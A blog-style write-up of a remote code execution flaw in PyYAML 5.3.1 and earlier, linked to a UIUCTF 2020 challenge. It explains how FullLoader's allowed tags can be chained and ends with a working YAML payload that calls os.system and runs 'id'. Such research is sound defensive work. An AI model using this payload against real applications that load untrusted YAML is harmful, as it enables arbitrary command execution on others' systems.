---
layout: post
title:  "Remote Code Execution on PyYAML Version<=5.3.1"
date:   2020-07-20 17:07:00
tags:   [RCE, Python]
---

### Description
This zero-day vulnerability was published in UIUCTF 2020 under the name Deserializeme(Couldn't solve though😢).
<br/>
<br/>


### Contents
When using yaml.load function, if Loader is not defined, it basically operates as `FullLoader`. `!!python/object/apply` tag can trigger function when it deserializing like pickle vulnerability. But this tag is only allowed when the Loader is `UnsafeLoader`. Also `CVE-2020-1747` was patched beloing the code on PyYAML 5.3.1. 
```python
# constructor.py
class FullConstructor(SafeConstructor):
    # 'extend' is blacklisted because it is used by
    # construct_python_object_apply to add `listitems` to a newly generate
    # python instance
    def get_state_keys_blacklist(self):
        return ['^extend$', '^__.*__$'] # Regexp is added, can't use extend keywords with listitems.

    def get_state_keys_blacklist_regexp(self):
        if not hasattr(self, 'state_keys_blacklist_regexp'):
            self.state_keys_blacklist_regexp = re.compile('(' + '|'.join(self.get_state_keys_blacklist()) + ')')
        return self.state_keys_blacklist_regexp
...
```
<br/>
<br/>


These are tags PyYAML supported.
```
### YAML tags and Python types
The following table describes how nodes with different tags are converted to Python objects.

YAML tag	Python type
Standard YAML tags	
!!null	None
!!bool	bool
!!int	int or long (int in Python 3)
!!float	float
!!binary	str (bytes in Python 3)
!!timestamp	datetime.datetime
!!omap, !!pairs	list of pairs
!!set	set
!!str	str or unicode (str in Python 3)
!!seq	list
!!map	dict
Python-specific tags	
!!python/none	None
!!python/bool	bool
!!python/bytes	(bytes in Python 3)
!!python/str	str (str in Python 3)
!!python/unicode	unicode (str in Python 3)
!!python/int	int
!!python/long	long (int in Python 3)
!!python/float	float
!!python/complex	complex
!!python/list	list
!!python/tuple	tuple
!!python/dict	dict
Complex Python tags	
!!python/name:module.name	module.name
!!python/module:package.module	package.module
!!python/object:module.cls	module.cls instance
!!python/object/new:module.cls	module.cls instance
!!python/object/apply:module.f	value of f(...)
```
<br/>
<br/>


`!!python/object/new` and `!!python/name` tags are allowed in `FullLoader`. Also `!!python/name` tag can load python modules and map object be triggered when converting `list` or `tuple` in python.
```python
>>> yaml.load('!!python/object/new:tuple [[1,2,3]]')
(1, 2, 3)

>>> yaml.load('!!python/name:os.system')
<built-in function system>

>>> list(map(os.system, ['id']))
uid=1000(03sunf) gid=1000(groot) groups=1000(groot),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
[0]
>>> tuple(map(os.system, ['id']))
uid=1000(03sunf) gid=1000(groot) groups=1000(groot),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
(0,)
```
<br/>
<br/>


So triggering functions is possible in `FullLoader`.
```python
!!python/object/new:tuple [ !!python/object/new:map [ !!python/name:os.system , [ "id" ] ] ]
uid=1000(03sunf) gid=1000(groot) groups=1000(groot),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```
